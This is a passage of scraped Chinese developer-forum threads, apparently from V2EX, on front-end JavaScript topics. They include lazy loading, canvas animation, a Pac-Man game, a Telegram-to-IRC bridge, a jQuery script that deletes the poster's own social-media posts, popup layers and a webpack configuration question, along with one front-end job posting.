喜多村英梨-血蹄 的微博\r", "\r", "来自:新浪微博"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>鄙人之前一直做 Android 的，刚做 H5 前端半年有余，因公司项目中有需求，需要懒加载效果，但 isroll 之类的插件过于庞大，而且发现滚动条都是自己实现的，不是很喜欢，觉得没必要，于是自己写了个很简单的类似的插件，欢迎大家拍砖。链接： <a href=\"https://github.com/zgc2537/zGenius\" rel=\"nofollow\">https://github.com/zgc2537/zGenius</a></p>\n</div></div>"], "reply": "8", "tittle": "写了一个很简单的 H5 懒加载插件，欢迎拍砖。", "comment": ["infinite scroll?", "建议参考下淘宝移动端的 H5 增量加载列表页,他们加了 DOM 回收机制,防止一直增量加载下去,页面上的 DOM 和资源太多.", " 跪求回收机制原理。我记得 Android 的 listview 是有回收机制的，不知道 H5 的这个机制是否原理一致？", " github 上有人模拟了 android 和 iOS 的回收机制,但是有点 BUG,你看淘宝移动端的列表页,增量加载到后面的时候,上面的 dom 内部的列表已经清空,只是保留了一个设置了高度的 div 而已,用户再划上去的时候,恢复数据,再填充回 dom", " 我利用 CHROME 的移动端模式去看了下淘宝的移动端的列表项，发现增加列表项后并没有回收 DOM 。", " 你下拉了几页?", " 从第十页开始,才开始回收上面的啊", " 加载了 39 页，第一页的 DOM 还在。。。不知道怎么上图。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如这个 swf ：\n<a href=\"http://xiexingcun.com/hanzi/ShowArticle.asp?ArticleID=3894\" rel=\"nofollow\">xiexingcun.com/hanzi/ShowArticle.asp?ArticleID=3894</a></p>\n<p>按照文字的笔顺依次填充完整个字，但是填充的时候都是横平竖直。在 canvas 动画中，有没有办法在填充的时添加一些变化，就像是用毛笔在写字的那种，而不是死板的横平竖直就填充完。</p>\n<p>有点像这个：\n<a href=\"http://xici.net/d161809338.htm\" rel=\"nofollow\">xici.net/d161809338.htm</a></p>\n</div></div>"], "reply": "6", "tittle": "用 canvas 做路径填充动画的问题", "comment": ["这场景显然 svg 啊 canvas 的话要复杂不少 极客上面有个绘字的教程通俗易懂", "其实就是按照笔画方向填充个矩形，然后根据字的轮廓的 path 来 clip 。 ", "多谢各位指点，现在有点眉目了。", "推荐你研究一下 SVG 的图片内置动画，很有趣，根据 boder 的虚线移动，就可以实现您要的写字效果，而且不需要任何 js 代码。\r", "\r", "思路是这样的：你可以用 svg 的一个路径来描绘一个笔画，用虚线来写，但是呢，这个虚线和实线的间隔长度都等于这个笔画的长度，你让虚线移动这个笔画的长度，就可以实现写字的动画了。", "如果您要用遮罩写字，下面移动一个长方体，来实现效果，那你也可以使用 paper.js 或者 dynamic.js 等 lib 来做一些动画，会比较简单", " 看了下两者，效果确实挺赞！多谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>海致微办公，期待优秀的你加盟！</p>\n<p>关于我们</p>\n<p><a href=\"http://www.weibangong.com\" rel=\"nofollow\">www.weibangong.com</a>\n我公司专注于企业级移动互联网应用。\n我司的使命：利用移动互联网和大数据技术帮助企业更简单高效。\n我司团队由国内互联网巨头前创始团队成员、高管和硅谷资深互联网专家构成，已获得多家顶级 VC 的投资。\n公司信奉硅谷的 IT 文化，团队文化轻松欢快，管理风格民主自由；福利保障高标准、全面且不断翻新。\n期待一个优秀的你加盟！</p>\n<p>公司价值观</p>\n<p>正直坦诚，用户至上；\n目标驱动，快速创新；\n追求极致，分享成长。</p>\n<p>我们的福利</p>\n<p>富有竞争力的薪酬；\n高期权+高额补助+丰厚的季度奖金；\n私家花园+24 小时+丰富的团队活动=360 度的员工关怀（节日福利+带薪年假+高额礼金+高额内推福利）。</p>\n<p>我们的需求</p>\n<p>Web 前端工程师！ 1-5 年经验，只要技术能满足我们的要求，请加入我们！</p>\n<p>我们的要求</p>\n<p>工作职责：\n-负责公司产品线产品的前端功能的设计、开发和优化；\n-负责前端架构优化及疑难问题攻关，及 Web 前沿技术研究和新技术调研。</p>\n<p>职位要求：\n-计算机及相关专业本科以上学历，扎实的计算机基础；\n-精通 JavaScript/HTML5/CSS3 ；\n-熟练使用 Linux 系统，对算法、数据结构以及后台开发(C/C++/PHP/Java 等)有一定了解；\n-熟悉 W3C 标准，对表现与数据分离、 Web 语义化等有深刻理解；\n-良好的审美品味，对前端视觉展现和交互细节有着不懈的追求。</p>\n<p>联系我们</p>\n<p>联系人： HR-Meggie\n手机 /微信： 13381088126\nQQ ： 2466227667\n邮箱： yangbo@haizhi.com\n地址：北京市海淀区学院路甲 5 号 768 创意园 B 座 5 号门 1132</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "海致微办公-Web 前端（ 15-30K）-北京海淀", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>telegramircd</h1>\n<p>telegramircd 类似于 bitlbee ，在 <a href=\"http://web.telegram.org\" rel=\"nofollow\">web.telegram.org</a> 和 IRC 间建起桥梁，可以使用 IRC 客户端收发朋友、群消息。</p>\n<h2>原理</h2>\n<p>修改<a href=\"https://web.telegram.org\" rel=\"nofollow\">https://web.telegram.org</a>用的 JS ，通过 WebSocket 把信息发送到服务端，服务端兼做 IRC 服务端，把 IRC 客户端的命令通过 WebSocket 传送到网页版 JS 执行。未实现 IRC 客户端，因此无法把群的消息转发到另一个 IRC 服务器(打通两个群的 bot)。</p>\n<h2>安装</h2>\n<p>需要 Python 3.5 或以上，支持<code>async/await</code>语法\n<code>pip install -r requirements.txt</code>安装依赖</p>\n<h3>Arch Linux</h3>\n<p>安装<a href=\"https://aur.archlinux.org/packages/telegramircd-git\" rel=\"nofollow\">https://aur.archlinux.org/packages/telegramircd-git</a>，会自动在<code>/etc/telegramircd/</code>下生成自签名证书(见下文)，导入浏览器即可。</p>\n<h3>其他发行版</h3>\n<ul>\n<li><code>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -out cert.pem -subj '/CN=127.0.0.1' -dates 9999</code>创建密钥与证书。</li>\n<li>Chrome 访问<code>chrome://settings/certificates</code>，导入 cert.pem ，在 Authorities 标签页选择该证书， Edit-&gt;Trust this certificate for identifying websites.</li>\n<li>Chrome 安装 Switcheroo Redirector 扩展，把<a href=\"https://web.telegram.org/js/app.js\" rel=\"nofollow\">https://web.telegram.org/js/app.js</a>重定向至<a href=\"https://127.0.0.1:9003/app.js\" rel=\"nofollow\">https://127.0.0.1:9003/app.js</a>。</li>\n<li><code>./<a href=\"http://telegramircd.py\" rel=\"nofollow\">telegramircd.py</a> --tls-cert cert.pem --tls-key key.pem</code>，会监听 127.1:6669 的 IRC 和 127.1:9003 的 HTTPS(兼 WebSocket over TLS)</li>\n</ul>\n<h2>IRC 客户端</h2>\n<ul>\n<li>IRC 客户端连接 127.1:6669</li>\n<li>刷新<a href=\"https://web.telegram.org\" rel=\"nofollow\">https://web.telegram.org</a>页面</li>\n<li>回到 IRC 客户端，会发现自动加入了<code>+telegram</code> channel</li>\n</ul>\n<p>在<code>+telegram</code>发信并不会群发，只是为了方便查看有哪些朋友。</p>\n<h2>IRC 命令</h2>\n<p>telegramircd 是个简单的 IRC 服务器，可以执行通常的 IRC 命令，可以对其他客户端私聊，创建 standard channel(以<code>#</code>开头的 channel)。另外若用 token 与某个微信网页版连接的，就能看到微信联系人(朋友、群联系人)显示为特殊 nick 、群显示为特殊 channel(以<code>&amp;</code>开头，根据群名自动设置名称)</p>\n<p>这些特殊 nick 与 channel 只有当前客户端能看到，因此一个服务端支持多个微信帐号同时登录，每个用不同的 IRC 客户端控制。另外，以下命令会有特殊作用：</p>\n<ul>\n<li>程序默认选项为<code>--join auto</code>，收到某个群的第一条消息后会自动加入对应的 channel ，即开始接收该群的消息。</li>\n<li><code>/dcc send nick/channel filename</code>，给 mutual friend 或群发图片 /文件。参见<a href=\"https://en.wikipedia.org/wiki/Direct_Client-to-Client#DCC_SEND\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Direct_Client-to-Client#DCC_SEND</a></li>\n<li><code>/list</code>，列出所有群</li>\n<li><code>/names</code>，更新当前群成员列表</li>\n<li><code>/part [channel]</code>的 IRC 原义为离开 channel ，转换为微信代表在当前 IRC 会话中不再接收该群的消息。不用担心， telegramircd 并没有主动退出群的功能</li>\n<li><code>/query nick</code>打开与<code>$nick</code>的私聊窗口，与之私聊即为在微信上和他 /她 /它对话</li>\n<li><code>/who channel</code>，查看群成员列表</li>\n</ul>\n<h2>显示</h2>\n<p><img alt=\"\" src=\"https://maskray.me/static/2016-05-07-telegramircd/run.jpg\"></p>\n<ul>\n<li><code>[Doc] $filename filesystem:<a href=\"https://web.telegram.org/temporary/t_filexxxxxxxxxxxxxxx\" rel=\"nofollow\">https://web.telegram.org/temporary/t_filexxxxxxxxxxxxxxx</a></code></li>\n<li><code>[Photo] filesystem:<a href=\"https://web.telegram.org/temporary/xxxxxxxxxxx\" rel=\"nofollow\">https://web.telegram.org/temporary/xxxxxxxxxxx</a></code>。图片(照片)</li>\n</ul>\n<p>vte 终端模拟器支持 URL 选择，但不能识别<code>filesystem:https://</code>。我修改的<code>aur/vte3-ng-fullwidth-emoji</code>添加了该类 URL 支持。</p>\n<p>termite <code>C-S-Space</code> URL 选择也不支持，可以用<a href=\"https://gist.github.com/MaskRay/9e1c57642bedd8b2b965e39b2d58fc82\" rel=\"nofollow\">https://gist.github.com/MaskRay/9e1c57642bedd8b2b965e39b2d58fc82</a>添加该类 URL 支持。感谢张酉夫的 ELF hack 指导。</p>\n<h2>已知问题</h2>\n<ul>\n<li>supergroup 和普通 chat 的 message 格式不同，不含<code>random_id</code>字段，没法判断该消息是否由 IRC 客户端生成的。</li>\n</ul>\n</div></div>"], "reply": "1", "tittle": "telegramircd——用 IRC 客户端控制 Telegram", "comment": ["这些程序员就是这么折腾，明明 telegram 刚通过 bot 支持 irc ，这下又回来了。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好吧，身为计科的学生，我都不好意思说，我快一年没刷过题了。做几个题找找感觉。刚开始做，有一起的小伙伴吗？</p>\n<p>我的答案：<a href=\"https://github.com/Youthink/LeetCode_JavaScript\">GitHub</a></p>\n</div></div>"], "reply": "37", "tittle": "在 leetcode 上用 javaScript 刷题，有一起的小伙伴吗？", "comment": ["竟然用 js 刷题， follow ， doge ：", "在用 python 刷", "我好早之前写过 Leetcode 。现在因为有份不错的工作，所以现在做题已经少多了。更多的是在玩各种前端的玩意。\r", "\r", "我也是用 JS 来写的，贴上我的 github ： ", "  做前端，挺喜欢 Js 的", " 已 star ，学习一下", "已 star, 加油, 我也是用 JS 刷的\r", "\r", "\r", "\r", "不过已经中断一段时间了, 更多在折腾别的项目= =", "同样也用 js 刷, 不过最近在忙其他..\r", "\r", "\r", "\r", "\r", "另外好想吐槽下楼主的 1_TwoSum.js ...", "同 @", " ，楼主的 TwoSum ，复杂度可能没法过吧？", "楼主的 twoSum 有种萌感。\r", "我也安利一发我的 Java 版本：\r", "一起来用 Python 刷吧 ,+_+", "\r", "\r", "我本地测试通过, 但是提交后提示内存溢出, 求解.", " 你把代码直接贴出来或者截图来看下吧", " 好像不登录没办法看到.\r", "\r", "换别处: ", " 刚才没看清题, 改了改: ", "\r", "\r", "Custom Testcase 添加了一些数字通过了, 但是提交的时候还是内存错误 Memory Limit Exceeded", "  人生苦短，用 python", "  是我写太简单了吗？要降低一下复杂度吗？", " Python 也不错", "  学习一下", "我用 Python 刚开始刷\r", "但是我经常题目都看不懂怎么破？", " 因为两层 for 循环？", "这位同学，又碰见你了 (´・ω・`)", "  找工具翻译一下呗", "  呵呵，”猿“家路窄", "贴一下我的：\r", " 两个 for 是 O(n*n)的时间，按理来说过不了才对。\r", "这题希望的是让用哈希表做到 O(n)的复杂度。", "以前也用 js 做 leetcode 感觉 js 写算法题 尤其是数据结构真是简单明了", "看楼主介绍才知道这个 leetcode ，上去小试了两题\r", "发现平时我代码里面都是用 jquery 和 underscore ，像遍历对象之类的事情居然想不起来怎么写……", "\r", "52 道题，很久没刷了", " 已 star 学习一下", " 嘿嘿， js 语言精粹", " 我也是在别人博客看到的", " 通过了啊，我试试哈希表，怪不得，别人都不是这样写的", "我在用 Swift 刷》。。", "刷起~\r", "[", " ", ")", "  刷起~~", "\r", "\r", "打开楼主 github 默默滚回来，哈哈哈楼主你这样子让一个正打算用 JS 刷题的人表示很难过呀（摊手）\r", "\r", "楼主你是不是发完这个贴没多久就放弃了哈哈哈。 Anyway ，加油！坚持！共勉！"]},
{"content": "", "reply": "20", "tittle": "JavaScript 里 var x = i = 0 这个写法是什么意思呢?", "comment": ["var i = 0\r", "var x = i", " 多谢 \r", "这种写法可读性太差了", "var a = b = c = d = 10 \r", "可读性多好", "这种写法会导致 i 变成全局变量. 所以等同写法是这样的\r", "\r", "i = 0\r", "var x = i", "如果 i 在之前未定义，恭喜你，创建了一个全局变量\r", "function abc(){var x=i=1;}\r", "abc()\r", "console.log(i) //1", "js 不用 var 的都是全局变量？", " \r", "i = 0;\r", "var x = i;", " 嗡了一声醒了过来。 i 没有事先声明...", " \r", " \r", " \r", "Thanks", " 对，除非在 strict 模式下", "糟糕的写法，最好不要这么写", "我去。。", "糟糕的写法，会隐式创建一个全局变量", " 涨姿势了", " 不是 var i 哟，是全局的 i", "另外补充下，这个全局变量和用 var 声明的全局对象是有区别的， var 定义的不能被 delete ，这个隐式全局变量是可以被 delete 的", "额,虽然写了几个月时间的 js,但是我还是不懂这种语法,但是我也不想学这种语法,因为这样写出的程序就是垃圾", " 这是恶意黑吗~很多语言都有类似用法~\r", "高阶语言的表达式更加强(e)大(xin)。。。看看 ES7 ，我已经不会 JavaScript 了", "  不算是黑它把? 我写代码力求表述清晰,不喜欢这种语法糖", " 不用 var 的变量是不规范的，在严格模式里是无效的"]},
{"content": ["<div class=\"topic_content\">提到爬虫，相信大家特别是开发者们都很熟悉。 Google 、百度等搜索引擎公司都是以爬虫为技术核心；另外随着 web 信息爆炸式的增长，很多开发者和企业都需要开发自己的爬虫，来做本站搜索或者数据统计和分析。\r<br>\r<br>目前开源的爬虫框架主要包括国内的 webmagic 和 webcollector ，国外的 scrapy ， nutch 、 pyspider 等，主要集中在 java 和 python 这两种语言，在功能扩展性和性能方面也各有优劣。同样的，神箭手开发团队早期也专注于爬虫框架的开发，后将爬虫框架分布式部署并脚本化，一方面为爬虫开发者提供更简单方便的开发框架，一切开发和运行完全在云端进行；另一方面基于分布式云计算的架构，可以大大提高爬虫的执行速度和效率。\r<br>\r<br>神箭手此次上线版本为后羿 v1.2 版，内测地址是： <a target=\"_blank\" href=\"http://www.shenjianshou.cn/%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%E5%8C%85%E6%8B%AC%EF%BC%9A\" rel=\"nofollow\">http://www.shenjianshou.cn/，主要功能包括：</a>\r<br>1 、 javascript 脚本云端编写爬虫，不需要配置编译环境；\r<br>2 、丰富的功能函数，包括 JS 渲染、代理 IP 、防屏蔽、数据发布和导出、图表控件等；同时支持 javascript 自有函数；\r<br>3 、爬虫直接在云服务器上并发执行，速度更快；\r<br>\r<br>欢迎爬虫开发者们踊跃使用，下面是一些有用的资源链接：\r<br>官方开发文档： <a target=\"_blank\" href=\"http://doc.shenjianshou.cn/\" rel=\"nofollow\">http://doc.shenjianshou.cn/</a>\r<br>爬虫 demo 源码： <a target=\"_blank\" href=\"https://github.com/ShenJianShou/crawler_samples\" rel=\"nofollow\">https://github.com/ShenJianShou/crawler_samples</a>\r<br>视频教程： <div class=\"embedded_video_wrapper\"><iframe class=\"embedded_video\" src=\"http://player.youku.com/embed/XMTU2NDk4MzE0NA==\" frameborder=\"0\" allowfullscreen></iframe></div>?from=s1.8-1-1.2\r<br>官方开发者 QQ 群： 342953471</div>"], "reply": "目前尚无回", "tittle": "在云上写爬虫，神箭手 后羿 v1.2 版强势来袭！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>很早就知道 canvas ，当时一直没应用到，最近闲来无事就顺便写写看。吃豆游戏可以说是我们 80 ， 90 后共同的回忆录，小时候常常在学习机上玩，所以也就有了强烈的欲望去写。为了写这个游戏，看了很多吃豆人游戏的相关信息，包括游戏规则，历史，其它相关游戏设计。又去了各个小游戏平台玩了下，找些灵感！！！就连最简单的配色，也是反复斟酌几个小时确定的方案……哈哈，不容易啊</p>\n<p>代码分两部分，游戏引擎和游戏主程序，引擎用来类的定义，管理动画场景，事件定义等等……游戏主程序主要组织业务逻辑。算面向对象编程吧，可以参考下\n游戏在这里： <a href=\"http://passer-by.com/pacman/\" rel=\"nofollow\">http://passer-by.com/pacman/</a> ，哈哈～可以关注 github 获得最新代码！纯手工打造</p>\n<p>是男人就吃光所有豆子!!!</p>\n</div></div>"], "reply": "60", "tittle": "自己重写的经典游戏-吃豆人", "comment": ["赞， GitHub 呢？", "👍", "上下左右的控制总觉得不够灵敏， Firefox 46.0.1", "mac safari 最新版表示上下左右不够灵敏。。。\r", "另外感觉 AI 好厉害，三路包夹我。。。是我手残么－ －", "玩了好几遍才能吃完", "很赞，制作很用心。", " ", " 是有一套算法，就是准备合作围堵玩家的", "很不错，完美复原。这都是小时候满满的回忆啊！", " 基本延续原游戏，寻路算法不一样，我这个更难些， 4 个幽灵配合着一起围堵", "OS X 10.9    Firefox 46.0.1\r", "像在放慢动作", " 等等我找 Firefox 测试下", "不错啊，不过细节还需要考据下。", "稍微有点卡顿……", "上下左右 总觉得不够灵敏    版本 50.0.2661.94 Google Chrome", "很赞，已 star", "很不错哦，好厉害~！", "为何我全吃完了还是 game over 。。。", " 因为我暂时只写了一关……哈哈哈，不过地图是可配置的，很容易写关卡", " 只有一定范围内才能控制，没错容错，不太想处理成那样", "幽灵能穿过墙？\r", "\r", "变灰之后再变回彩色的时候，从老窝的右侧墙穿出来了", " 不可以啊，直接走出来？应该只能走一段，发现不能走又回去才对呀", "不错就是不太灵敏", "上下左右的控制总觉得不够灵敏， Firefox 46.0.1", "上 不是很灵敏。 被 3 一块堵太丧心病狂了。。是好久没玩游戏了吗，，手残。。。", " 是我写的围堵算法", "确实控制不灵敏... osx chrome", " 时机问题啦，一般游戏会做控制的容错处理，我设计的就是错过了就不让控制了", " 已 git  拓展下兴趣。感谢开源。", "送给和我一样玩不过去的手残: F12 ，把中间那一圈 2 改成 1 ，怪物就跑不出来了", " 哈哈哈， 0 表示路， 1 表示墙壁， 2 表示选择性的路（只有幽灵走）", "你就是三姑六婆的作者？", "感觉速度太快了，还有就是键盘监听好像不是很灵敏", "画面很好很细腻", " 之前有人开发我，我自己前两个月开发也开发了个版本", " 你说的那个 APP 是我上星期用 react native 做的，所以应该和你用的不一样", " 画超级久！颜色我都调好久", " 哦", " 我早上看过另外一个人实现版本的数据库，我觉得应该我那种比较方便", "你好，能支持下 wasd 吗？ hhkb 按方向键玩游戏真心无力。。。", " 强", "已支持 ", " 哈哈哈， fork 下，自己动手丰衣足食", "上下左右的控制 不够灵敏", " 慢慢就习惯啦，控制有时间限制的", "👍", "楼主的代码整齐真漂亮", "如果性能再能优化一点就更好了，现在玩一会 CPU 就爆表了", " 可能是因为我用的是帧动画，有时屏幕刷新不过来", "github 呢？触发不太灵敏。", "赞~", " ", "  触发点是对的，只是没有容错处理", "很赞，但是总感觉惯性太大，切换方向的时候不灵敏", " 这个也是游戏的难点啊，切换时机的把握", "好强，大神", "我也是 firefox ，体验相当差，非常不灵敏", " 哈哈哈，主要是算法研究，不保证兼容除 chrome 以外的浏览器～", "非常不灵敏", "上下左右  不灵敏，有时候还失灵，真是捉急。 chrome 版本 50.0.2661.94 m\r", "感谢，找了找回忆。", " 故意这么设计的，时机不对不然转弯"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好久没上人人了，上去打算把东西都删了，状态没有批量删除，尝试用 js 来操作。</p>\n<pre><code>'use strict';\n\nvar a = jQuery('.page-next');\nvar b = jQuery('.page-prev');\n\nvar job = jQuery.Deferred();\nvar l = setInterval(function () {\n  job.then(function () {\n    if (jQuery('.del-status').length === 0) {\n      if (a.hasClass('page-disable') &amp;&amp; b.hasClass('page-disable')) {\n        clearInterval(l);\n        console.log('clear');\n        return false;\n      }\n      if (a.hasClass('page-disable')) {\n        var _ref = [b, a];\n        a = _ref[0];\n        b = _ref[1];\n\n        console.log('turn around');\n      }\n      console.log('next');\n      a.click();\n    }\n  }).then(function () {\n    jQuery('.del-status').eq(0).click();\n  }).then(function () {\n    jQuery('.ui-dialog button').eq(2).click();\n  });\n  job.resolve(1);\n}, 1000);\n</code></pre>\n<p>现在状态都删清光了所以代码可能有问题也测试不出来……不过删除是没问题的，或者你可以提一些意见</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>'use strict';\n\nvar a = jQuery('.page-next');\nvar b = jQuery('.page-prev');\n\nvar l = function l() {\n  console.log('check items');\n  if (jQuery('.ugc-list-item').length === 0) {\n    if (a.hasClass('page-disable') &amp;&amp; b.hasClass('page-disable')) {\n      console.log('clear');\n      return false;\n    }\n    if (a.hasClass('page-disable')) {\n      var _ref = [b, a];\n      a = _ref[0];\n      b = _ref[1];\n\n      console.log('turn around');\n    }\n    console.log('next');\n    a.click();\n  }\n  console.log('delete');\n  jQuery('.share-item-delete').each(function () {\n    jQuery(this).click();\n  });\n  console.log('confirm');\n  jQuery('.ui-dialog button').delay(1000).each(function () {\n    jQuery(this).click();\n  });\n  //setTimeout(l,1000)\n};\nl();\n</code></pre>\n<p>发现收藏也要删，继续上代码，然而删一页会刷新一次所以要手动执行</p>\n</div></div>"], "reply": "10", "tittle": "js 代码批量删除人人状态", "comment": ["直接注销", "直接注销啊  这网站还有人玩？", "不说我都不记得有这个网站了...", "干嘛删呢，也是些学生时代的回忆", "还在上面泡到个未成年并不可描述...", " \r", " \r", "我以前似乎停用过，但是重新登录，资料还在", " 停用时间不够长", "以前邮箱登录的 后来强制绑定手机就不用了…", "哎....看着大学时幼稚的吐槽...觉得...账号现在私密了，就留那里吧", " \r", "幼稚倒说不上，只是现在越来越少在社交平台上表达自己了，即使在朋友圈。\r", "可能是觉得累了没意思，还不如多打几行代码。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需求大概是这样的：在我博客里的相册栏目，我要 [创建 /修改] 相册，不想跳到新的页面，说一下我各种实现方式：</p>\n<p>1 、最初是在 body 结束之前事先写好 div 的弹出层并设置为 display:none; 使用的时候 show() 出来；</p>\n<p>2 、后来发现这种到处写弹出窗很傻，而且一个页面如果包含很多操作，那页面下面会有一堆预先写好的 div 层，于是在 js 里面写了一个简单的 createPop() 方法，基本就是通过 createElement/appendChild 的方式创建并将弹出层在使用时临时绑定到 body 上，主要包含两个部分： pop/pop-bg ，前者是弹出层，后者是半透明遮罩层。而 pop 里又分成 pop-title/pop-body/pop-button ，分别对应 标题栏 /内容区域 /按钮栏。而弹出层的销毁就直接 removeElement 。这样比如创建一个 [创建相册] 的弹出层则直接定义一个 createAlbum 方法，里面主要干 3 件事，首先调用 createPop() 创建弹出层，再往 pop-body 里塞入创建相册的表单 html ，最后绑定 createAlbumSubmit 事件到 pop-button 中的提交按钮，点击按钮后首先检查表单，然后通过 ajax 发送创建信息，成功则调用 createAlbumCallback 关闭弹出层并在 ul li 的相册列表中动态塞入一个新 li 相册并提示创建成功。</p>\n<p>3 、再后来看到 qq 空间和 <a href=\"http://vk.com\" rel=\"nofollow\">vk.com</a> 的实现，创建相册时都是需要请求远程地址的，前者是 iframe 嵌入到弹出层，后者是 ajax 请求比如 createAlbum.php 后将内容自己塞入弹出层，其实我本人比较倾向于后者， qq 的 iframe 在 input 提示错误信息往下挤的时候外层弹出层并不会扩大，按钮会被隐藏掉一部分，可能 iframe 也只有在相册弹出层比较有优势吧，比如发布文章时的插入图片功能。</p>\n<p><a href=\"http://vk.com\" rel=\"nofollow\">vk.com</a> 的 common.js 里看到了 MessageBox 和 showBox ，大概估计是实现弹出层的... 但是对于一个 phper 来说现在的 js 什么 prototype/extend/react 看起来实在是炸了（满屏幕的 js 啊...），不知道我上面实现弹出层的思路方向是不是对的？如何实现的比较通用？或者前辈们收集有一些文章能不能分享下 (๑•̀ㅂ•́)و✧</p>\n</div></div>"], "reply": "6", "tittle": "JS 实现弹出层", "comment": ["你的思路是对的。只不过数据有的是用了 iframe ，有的是远端拿过来 html 。而你的是提前把 html 拿过来放到这里，用的时候直接显示。", "iframe 可能是方便 post 数据吧~(毕竟这样不要自己写)\r", "在看 react.js 核心就是你这个思路，写完也差不多就是你上面这样，一大堆 JS 然后调用构造 HTML ，准确来说所有的都是酱紫~\r", "不过你的创建 /修改也就 2 个 pop 层呐？为何会做的这么麻烦？", "bootstrap 的 popover?", "现代一点浏览器都支持 formData API ，用这个配合 XHR 就能上传了， iframe 是 ie 6 年代的东西了。可参考 ", " 写的通用点，其实是考虑到其他用途，比如 pop 出的层通过 createPop() 传递一些参数，可以弹出一些没有操作按钮的 loading/processing 小窗，或者是提示层（ setTimeout 几秒后消失）。但是发现很多实现是还有关联在当前弹出层的弹出层，比如 qq 相册创建的时候选择 “回答问题可见” 之后出现的新的弹出层，看到这种关联瞬间又炸了...", " 把这些通用的做参数传进去， Content 填自定义 HTML 不就好了~事件绑定在传入的 HTML 元素上\r", "\r", "然后多个层的话~考虑一下可能出现的情况，分下级~\r", "\r", "不过这样有个问题， Remove 元素，下次使用事件需要重新绑定"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为最近的项目写的移动端调试面板，欢迎拍砖:)</p>\n<p><a href=\"https://github.com/liriliri/eruda\" rel=\"nofollow\">https://github.com/liriliri/eruda</a></p>\n<p><img alt=\"eruda\" src=\"http://7xn2zy.com1.z0.glb.clouddn.com/eruda_screenshot.jpg\"></p>\n</div></div>"], "reply": "10", "tittle": "手机网页前端调试面板", "comment": ["不错！正好需要！ how to pronounce eruda?", " 百度一下你就知道是什么了:)", " 谷歌“ eruda ”找不到，搜搜“ eruda 什么意思”找到正确结果。。", " 所以说了要百度啊。。。 Eruda (エルダ) is the Japanese name for Elda, an A.I. entity in Chobits. She is more commnly known as Chi (ちぃ).", "这么吊？相当于做了个简单的 F12 出来？\r", "\r", "PS ：用 chrome 、 safari 不可以联机调试吗？", " 可以，但只能连手机端的 Chrome ，没多大实际用处， Firefox 也是。目前开发主要是各种移动端的 Webview 里，需要调用各种特定的 jsApi ，并且测试时需要显示用户信息方便后台定位数据 BUG 。此外， Weinre ， Vorlonjs 跟 debugGap 等工具连接麻烦，并且只能调调样式，打打 log ，还不如写个插件在手机上直接查看。实际上遇到的情况经常是每次测试同事发现问题都要拿手机过来连本地环境，再打上一句 window.onerror alert 调，这样做实在很蠢。", " 有时浏览器跑得好好的，结果发现手机上悲剧了，然后查了发觉是客户端 Webview 没开启对 cookie 和 localStorage 支持:(", "一般用 [browser-sync]( ", ") 调试。", " 功能有点弱。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为了挑战自己的算法，用最短的代码实现 24 点计算公式的输出！\n就是 4 个数字如何通过加减乘除的四则混合运算得出 24 点\n<a href=\"http://passer-by.com/calc24/\" rel=\"nofollow\">http://passer-by.com/calc24/</a></p>\n</div></div>"], "reply": "14", "tittle": "简易的 24 点计算器", "comment": ["顺便放个 7 ， 8 年前写的古董给大家对照把玩 ", "24 点的乐趣不就是挑战大脑么", "代码呢？\r", "24 点游戏的中心不是找出所有可行方案，而是最快找出一个可行方案，思路比结果重要", " 右键查看源代码呀", " 对呀对呀，可是有人想不出来要提示的", " 你俩神配合，一个提问，一个答案。", "顺便放一个进阶版本供大家把玩 ", " 为什么是进阶版呢？我们写的都不一样的东西，你写游戏，我写的公式计算", "不太熟 js ，没看出用了什么算法，穷举？\r", "\r", " \r", "建议加上位运算，更好玩\r", "例如 2,5,5,6 ，四则无解，但位运算有解 5*5-(6>>2)", " 加上导数和阶乘还有通解。。。\r", "(A'! + B'! + C'! + D'!)! = 4!= 24 （ 0 的阶乘规定为 1 ）", " \r", "这个是，不过通解没意思", " 有位运算的吧", " 我的规则集经过深思熟虑的，一旦接受了设定很容易上瘾", " \r", "Y\r", "是我看花眼了，瞥一眼看到^想当然乘方，没留意是 XOR ，其他几个符号就加 MASK 视而不见了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://webpack.github.io/docs/code-splitting.html#split-app-and-vendor-code\" rel=\"nofollow\">https://webpack.github.io/docs/code-splitting.html#split-app-and-vendor-code</a>\n参考此文的 \"Split app and vendor code\" , 能把 js 文件分离出来,但 css 无效</p>\n<p>我的 webpack 配置</p>\n<pre><code>var webpack = require(\"webpack\");\nvar ExtractTextPlugin = require(\"extract-text-webpack-plugin\");\n\nmodule.exports = {\n  entry: {\n    app: \"./entry.js\",\n    vendor: ['bootstrap'],\n  },\n    output: {\n        path: __dirname + \"/dist\",\n        filename: \"bundle.js\"\n    },\n    module: {\n        loaders: [\n        { test: /\\.less$/, loader: ExtractTextPlugin.extract(\"style-loader\", \"css-loader!less-loader\")},\n        { test: /\\.css$/, loader:  ExtractTextPlugin.extract(\"style-loader\", \"css-loader\") },\n        { test: /\\.(png|woff|woff2|eot|ttf|svg)$/, loader: 'url-loader?limit=100000' },\n        ]\n    },\n    plugins: [\n      new webpack.optimize.CommonsChunkPlugin(/* chunkName= */\"vendor\", /* filename= */\"vendor.bundle.js\"),\n      new ExtractTextPlugin(\"[name].bundle.css\", {allChunks: false}),\n    ]\n};\n</code></pre>\n<p>能生成 vendor.bundle.js 文件,且文件内容包含 bootstrap . 但没有生成 vendor.bundle.css 文件.\n是 extract-text-webpack-plugin 不支持吗?</p>\n<p>想到一种比较笨的办法,就是再建一个 css_entry.js 文件, 在文件里面调用  